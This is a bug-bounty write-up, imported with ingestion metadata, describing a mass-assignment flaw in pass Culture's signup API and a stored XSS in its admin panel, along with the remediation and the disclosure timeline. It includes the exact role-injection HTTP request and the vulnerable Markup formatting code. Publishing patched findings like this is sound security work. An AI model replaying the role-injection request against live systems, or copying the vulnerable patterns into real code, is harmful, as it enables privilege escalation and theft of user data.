---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-04-26_privileged-account-creation-via-mass-assignment-towards-a-full-compromise-using-.md
original_filename: 2022-04-26_privileged-account-creation-via-mass-assignment-towards-a-full-compromise-using-.md
title: Privileged account creation via Mass Assignment towards a full compromise using
  a Stored XSS
category: documents
detected_topics:
- xss
- automation-abuse
- idor
- command-injection
- rate-limit
- cors
tags:
- imported
- documents
- xss
- automation-abuse
- idor
- command-injection
- rate-limit
- cors
language: en
raw_sha256: f0aca80707c7c066c6e9e898c297aeea38abb384ebc3fa756bb9fb969958ab94
text_sha256: 3473a4b18bafff5892f5a8e742d1788dfff90165f988cd54bd9c62d6c5c6b886
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-04-26_privileged-account-creation-via-mass-assignment-towards-a-full-compromise-using-.md
- Source Type: markdown
- Detected Topics: xss, automation-abuse, idor, command-injection, rate-limit, cors
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `f0aca80707c7c066c6e9e898c297aeea38abb384ebc3fa756bb9fb969958ab94`
- Text SHA256: `3473a4b18bafff5892f5a8e742d1788dfff90165f988cd54bd9c62d6c5c6b886`


## Content

---
title: "Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS"
page_title: "[EN] Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS - Aethlios"
url: "https://www.aeth.cc/public/Article-Pass-Culture/mass-assignment-article-en.html"
final_url: "https://www.aeth.cc/public/Article-Pass-Culture/mass-assignment-article-en.html"
authors: ["Aethlios (@AethliosIK)"]
programs: ["pass Culture"]
bugs: ["Stored XSS", "Mass assignment", "Security code review"]
publication_date: "2022-04-26"
added_date: "2023-01-09"
source: "pentester.land/writeups.json"
original_index: 2683
---

# __[EN] Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS

Disclaimer : this exploitation was realized in a legal context of a Bug Bounty. The disclosure of the information contained in this article was made with the agreement of pass Culture and comes after a patch.  
The Bug Bounty program is not public and participation is only possible after contracting with YesWeHack and invitation by pass Culture.

## __Abstract

Using the account creation mechanism, it was possible to obtain an account with privileged rights from a [Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html). From this privileged account, the injection of a payload allowed to realize a [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) within the administration panel impacting an administrator account.

![pass Culture](https://www.aeth.cc/public/Article-Pass-Culture/pass-culture.png)

## __Table of contents

  * [EN] Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS
  * Abstract
  * Table of contents
  * I - Context
  * II - First vulnerability
  * III - Exploitation
  * III.1 - Confirming vulnerability
  * III.2 - Partial administrator account
  * III.3 - JOUVE account
  * IV - Second vulnerability
  * V - Exploitation requirements
  * VI - Impacts
  * VI.1 - Impacts of the first vulnerability
  * VI.2 - Impacts of the second vulnerability
  * VII - Remediation
  * VIII - Timeline
  * IX - Conclusion

## __I - Context

For the launch of the French government initiative allowing access to culture for the youngest, the public service « [pass Culture](https://pass.culture.fr/) » was able to launch a Bug Bounty program to audit its application.

The pass Culture service allows young people, from 15 years old, to access a catalog of offers of shows, books, musical instruments and other digital services for a budget of up to 300€.

Following [my first article on a Stored XSS found on this program](https://www.aeth.cc/public/Article-Pass-Culture/stored-xss-article-en.html), I continued to analyze the source code of the application.

## __II - First vulnerability

While exploring the different routes of the API, I find an endpoint allowing the creation of a “beneficiary” account which seems deprecated.

Indeed, a more recent main endpoint is provided for the creation of “beneficiary” and “professional” type accounts.
  
  
  # @debt api-migration
  @private_api.route("/users/signup/webapp", methods=["POST"])
  @feature_required(FeatureToggle.WEBAPP_SIGNUP)
  def signup_webapp():
  objects_to_save = []
  check_valid_signup_webapp(request)
  
  new_user = User(from_dict=request.json)
  new_user.email = sanitize_email(new_user.email)
  
  [...]
  
  new_user.remove_admin_role()
  new_user.remove_beneficiary_role()
  new_user.isEmailValidated = True
  new_user.needsToFillCulturalSurvey = False
  new_user.hasSeenTutorials = True
  objects_to_save.append(new_user)
  
  repository.save(*objects_to_save)
  
  update_external_user(new_user)
  
  return jsonify(as_dict(new_user, includes=BENEFICIARY_INCLUDES)), 201
  

I notice that the user input of this endpoint is directly injected into a database model `User` and then some attributes are modified before insertion into the database.

  * _For example, the user can provide a list of roles as input, then the application removes the administrator and beneficiary roles._

Here we have a bad practice: the application creates a new database object with all the data provided as input and then removes the sensitive attributes. Therefore, in case of source code evolution, if a new role is added and it is not checked, this could create a vulnerability.

Let’s analyze the different possible roles in a database:
  
  
  class UserRole(enum.Enum):
  ADMIN = "ADMIN"
  BENEFICIARY = "BENEFICIARY"
  PRO = "PRO"
  # TODO(bcalvez) : remove this role as soon as we get a proper identification mecanism in F.A.
  JOUVE = "JOUVE"
  UNDERAGE_BENEFICIARY = "UNDERAGE_BENEFICIARY"
  
  class User(PcObject, Model, NeedsValidationMixin):
  __tablename__ = "user"
  
  email = sa.Column(sa.String(120), nullable=False, unique=True)
  
  [...]
  
  isAdmin = sa.Column(
  sa.Boolean,
  sa.CheckConstraint(
  (
  f'NOT (({ UserRole.BENEFICIARY }=ANY("roles") OR { UserRole.UNDERAGE_BENEFICIARY }=ANY("roles")) '
  f'AND { UserRole.ADMIN }=ANY("roles"))'
  ),
  name="check_admin_is_not_beneficiary",
  ),
  nullable=False,
  server_default=expression.false(),
  default=False,
  )
  
  [...]
  
  roles = sa.Column(
  MutableList.as_mutable(postgresql.ARRAY(sa.Enum(UserRole, native_enum=False, create_constraint=False))),
  nullable=False,
  server_default="{}",
  )
  
  def remove_admin_role(self) -> None:
  self.isAdmin = False
  if self.has_admin_role:  # pylint: disable=using-constant-test
  self.roles.remove(UserRole.ADMIN)
  
  @hybrid_property
  def has_admin_role(self) -> bool:
  return UserRole.ADMIN in self.roles or self.isAdmin if self.roles else self.isAdmin
  
  

**Firstly** , I notice that two rights mechanisms coexist: an `isAdmin` boolean and a `roles` array containing values from the `UserRole` enumeration.

  * _To be an administrator, for example, one must have the value`"ADMIN"` contained in the array `roles` **or** the boolean `isAdmin` to `true`, if this array is empty._

**Secondly** , the role `JOUVE` seems to exist but is not part of the list of attributes checked during the creation of an account.

## __III - Exploitation

From this source code review, I can make several assumptions:

  * When an account is created, the input of a role table will be stored in the model.
  * Even if some attributes are changed, it is possible that some attributes are not checked.
  * This seems to be the case for the `JOUVE` role.

I deploy a local instance with [deployment via docker-compose](https://github.com/pass-culture/pass-culture-main) provided by pass Culture to confirm my assumptions.

### __III.1 - Confirming vulnerability

So I inject the role `JOUVE` but also the role `ADMIN` just to be sure :
  
  
  POST /users/signup/webapp HTTP/2
  Host: backend.staging.passculture.team
  Accept: application/json
  Content-Type: application/json
  Content-Length: 205
  
  {
  "email": "notmyemail@example.com",
  "password": " p/q2-q4!",
  "publicName": "Aethlios-PoC",
  "contact_ok": true,
  "roles": ["JOUVE", "ADMIN"]
  }
  
  
  
  HTTP/2 201 Created
  Content-Type: application/json
  Content-Length: 819
  Access-Control-Allow-Origin: https://app.passculture-staging.beta.gouv.fr
  Access-Control-Allow-Credentials: true
  Vary: Origin
  X-Frame-Options: SAMEORIGIN
  X-Content-Type-Options: nosniff
  X-Xss-Protection: 1; mode=block
  Strict-Transport-Security: max-age=15724800; includeSubDomains
  
  {
  "dateCreated": "2021-11-21T02:33:06.497584Z",
  "email": "notmyemail@example.com",
  "publicName": "Aethlios-PoC",
  "roles": ["JOUVE", "ADMIN"]
  }
  

My assumptions were confirmed!

But an unexpected behavior was also found: in addition to the `JOUVE` role, the `ADMIN` role is also injected.

I check if I have access to the administration panel: _it is not the case._ **But it’s not over yet.**

### __III.2 - Partial administrator account

Since the two role mechanisms coexist, the evolution of the source code from the first mechanism to the second is only partial. Thus, only certain features - _the most recent_ \- that use the `has_admin_role` function are accessible.

Thus, with this partial administrator account, I am able to leak sensitive data:

  * Export of all the beneficiaries’ reservations with first name, last name, email, phone, store and product price.
  * Export of refunds with first and last name of the user, amount as well as the name, SIRET (_French business identification number_) and IBAN of these stores.

**But why do I manage to define the administrator role when the source code seems to control it?**

After many tests, I conclude that the root cause is the dynamic typing of Python :

  * Indeed, the different roles are defined by an enumeration `UserRole` and I inject a string `"ADMIN"` into the `roles` array. Thus, the source code removes the enumeration from the array, but not the string. Whereas in the database, these two types will be represented in the same way, via a string. Indeed, the enumeration of the role array is set with the [`native_enum`](https://docs.sqlalchemy.org/en/13/core/type_basics.html#sqlalchemy.types.Enum.params.native_enum) flag.

To verify my hypothesis, I modified the source code locally and then injected the string `"ADMIN"` into the array `roles` :
  
  
  # @debt api-migration
  @private_api.route("/users/signup/webapp", methods=["POST"])
  @feature_required(FeatureToggle.WEBAPP_SIGNUP)
  def signup_webapp():
  objects_to_save = []
  check_valid_signup_webapp(request)
  
  new_user = User(from_dict=request.json)
  new_user.email = sanitize_email(new_user.email)
  
  print(new_user.roles)
  new_user.remove_admin_role()
  print(new_user.roles)
  new_user.add_admin_role()
  print(new_user.roles)
  new_user.remove_admin_role()
  print(new_user.roles)
  
  
  
  pc-flask  | ['ADMIN']
  pc-flask  | ['ADMIN']
  pc-flask  | ['ADMIN', <UserRole.ADMIN: 'ADMIN'>]
  pc-flask  | ['ADMIN']
  

### __III.3 - JOUVE account

With this role, however, I have access to the full range of features.

This role allows a user to interact with the service [Jouve](https://www.jouve.com/en/gestion-electronique-de-documents-ged) responsible for the automated verification of user identities.

Thus, I do not have direct access to the user identity documents with this role, but I am able to validate a user as well as request a new validation from the Jouve service on an already verified user.

![support-list.png](https://www.aeth.cc/public/Article-Pass-Culture/support-list.png)  
![support-details.png](https://www.aeth.cc/public/Article-Pass-Culture/support-details.png)

While analyzing the source code to determine the features specific to a Jouve account, I find a strangely familiar piece of code…

##  __IV - Second vulnerability
  
  
  def beneficiary_fraud_review_formatter(view, context, model, name) -> Markup:
  result_mapping_class = {
  fraud_models.FraudReviewStatus.OK: "badge-success",
  fraud_models.FraudReviewStatus.KO: "badge-danger",
  fraud_models.FraudReviewStatus.REDIRECTED_TO_DMS: "badge-secondary",
  }
  if model.beneficiaryFraudReview is None:
  return Markup("""<span class="badge badge-secondary">inconnu</span>""")
  
  return Markup(
  f"<div><span>{model.beneficiaryFraudReview.author.firstName} {model.beneficiaryFraudReview.author.lastName}</span></div>"
  f"""<span class="badge {result_mapping_class[model.beneficiaryFraudReview.review]}">{model.beneficiaryFraudReview.review.value}</span>"""
  )
  

Those who have read [my first article](https://www.aeth.cc/public/Article-Pass-Culture/stored-xss-article-en.html) will have recognized a misuse of the `MarkupSafe` library allowing a Stored XSS.

Jouve accounts can create a fraud review on a beneficiary account. By injecting a JS payload into the first or last name of the account, the Stored XSS can be triggered.

Any administrator accessing this page will trigger this Stored XSS.

![xss-triggered.png](https://www.aeth.cc/public/Article-Pass-Culture/xss-triggered.png)

Despite the fix of the first Stored XSS as well as the global fix on the use of the `MarkupSafe` library, a misuse seems to have appeared afterwards during the evolution of the source code.

## __V - Exploitation requirements
  
  
  # @debt api-migration
  @private_api.route("/users/signup/webapp", methods=["POST"])
  @feature_required(FeatureToggle.WEBAPP_SIGNUP)
  def signup_webapp():
  
  [...]
  
  if settings.IS_INTEGRATION:
  objects_to_save.append(payments_api.create_deposit(new_user, "test"))
  else:
  authorized_emails, departement_codes = get_authorized_emails_and_dept_codes(ttl_hash=get_ttl_hash())
  departement_code = _get_departement_code_when_authorized_or_error(authorized_emails, departement_codes)
  new_user.departementCode = departement_code
  
  [...]
  
  return jsonify(as_dict(new_user, includes=BENEFICIARY_INCLUDES)), 201
  
  

The creation of a new user has three conditions:

  * The account’s department must be an authorized department.
  * The account’s email address must be included in a white list of authorized email addresses.
  * The account creation feature must be enabled by the administrator.

The first condition can be easily bypassed, but the second one requires to know the content of this white list.

However, I was able to reproduce in the pre-production environment using the email address of one of the pass Culture contacts I was able to exchange with to get my accounts. It can be considered that an attacker could use OSINT to create a list of pass Culture staff emails in order to find out one of the emails belonging to this white list.

## __VI - Impacts

###  __VI.1 - Impacts of the first vulnerability

Accepted CVSS : [CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N) aka **8.7** (High)

  * **Attack Complexity** (AC) : **High** (H) :  
The attacker must know the whitelist of email addresses allowed to create an account and at least one of these accounts must not yet be created. However, the verification of these email addresses is not mandatory to access the created account.
  * **Scope** (S) : **Changed** (C) :  
From this exploit, an attacker without an account can obtain a privileged account accessing some parts of the administration panel.
  * **Confidentiality** (C) : **High** (H) :  
Some sensitive data of all users may be leaked.
  * **Integrity** (I) : **High** (H) :  
All users can be validated or invalidated from the rights of the Jouve account.
  * **Availability** (A) : **None** (N).

### __VI.2 - Impacts of the second vulnerability

Suggested and accepted CVSS : [CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) aka **9.1** (Critical)

  * **Privileges Required** (PR) : **High** (H) :  
The attacker must have a Jouve account.
  * **User Interaction** (UR) : **None** (N) :  
The administrator only needs to access the usual path to trigger the XSS without being aware of it.
  * **Scope** (S) : **Changed** (C) :  
From this exploit, an attacker can execute actions from the administration panel.
  * **Confidentiality** (C) : **High** (H) :  
All user data can be leaked.
  * **Integrity** (I) : **High** (H) :  
All users and offers can be altered.
  * **Availability** (A) : **High** (H) :  
All users can be suspended.

## __VII - Remediation

For this first vulnerability, the pass Culture team decided, as soon as the report was received, to disable the account creation feature in the production environment to prevent any malicious exploitation, and then to simply remove this deprecated part of the code:

  * [Commit with first fix](https://github.com/pass-culture/pass-culture-main/commit/96b46ebb00698f967909ff0f418e9286d4c98756)

For the Stored XSS, a fix similar to the patch implemented on the first XSS has been deployed:

  * [Commit with second fix](https://github.com/pass-culture/pass-culture-main/commit/b65f54c75f1276981afe24a9f776c64aa9cd5f54)

In addition to this fix, preventive measures have been implemented using PyLint to prevent possible recurrences:

  * [Commit PyLint](https://github.com/pass-culture/pass-culture-main/commit/71f666a3aff0a81a53f8b2978e05f0972f341631)

## __VIII - Timeline

  * 2021-11-21 - **Submission** (Both vulnerabilities)
  * 2021-11-21 - **Vulnerable feature has been disabled on the production environnement** (Arbitrary creation of privileged account)
  * 2021-11-22 - **Under review** (Both vulnerabilities)
  * 2021-11-23 - **[Commit with fix](https://github.com/pass-culture/pass-culture-main/commit/96b46ebb00698f967909ff0f418e9286d4c98756)** (Arbitrary creation of privileged account)
  * 2021-11-23 - **[Commit with fix](https://github.com/pass-culture/pass-culture-main/commit/b65f54c75f1276981afe24a9f776c64aa9cd5f54)** (Stored XSS)
  * 2021-11-29 - **Acceptation** (Both vulnerabilities)
  * 2021-12-02 - **Rewards** (Maximum high reward and maximum critical reward)
  * 2022-04-26 - **Disclosure**
  * 

## __IX - Conclusion

Reading source code to find vulnerabilities **is fun**. But that’s only one aspect of finding vulnerabilities.

Indeed, without using the black-box research, I would never have found out that it was possible to inject the administrator role into the created account. Reading the source code only put me on the good way.

Thus, the source code review must be used as a basis for understanding how the application works, but the search for vulnerabilities must not be limited to reading the source code to find them. **Black-box and white-box are complementary.**

Moreover, if a vulnerability is present in the source code, it should probably exist elsewhere. Let’s be patient with the correction of the vulnerabilities already submitted. Once the first vulnerability is fixed, we can consider with certainty that this second vulnerability is not a duplicate.

> **Don’t hesitate to look for vulnerabilities in whitebox programs, it’s slow, but it’s instructive and it learns to develop better.**

__

  * [EN] Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS
  * Abstract
  * Table of contents
  * I - Context
  * II - First vulnerability
  * III - Exploitation
  * III.1 - Confirming vulnerability
  * III.2 - Partial administrator account
  * III.3 - JOUVE account
  * IV - Second vulnerability
  * V - Exploitation requirements
  * VI - Impacts
  * VI.1 - Impacts of the first vulnerability
  * VI.2 - Impacts of the second vulnerability
  * VII - Remediation
  * VIII - Timeline
  * IX - Conclusion

Expand allBack to topGo to bottom

  * [EN] Privileged account creation via Mass Assignment towards a full compromise using a Stored XSS
  * Abstract
  * Table of contents
  * I - Context
  * II - First vulnerability
  * III - Exploitation
  * III.1 - Confirming vulnerability
  * III.2 - Partial administrator account
  * III.3 - JOUVE account
  * IV - Second vulnerability
  * V - Exploitation requirements
  * VI - Impacts
  * VI.1 - Impacts of the first vulnerability
  * VI.2 - Impacts of the second vulnerability
  * VII - Remediation
  * VIII - Timeline
  * IX - Conclusion

Expand allBack to topGo to bottom
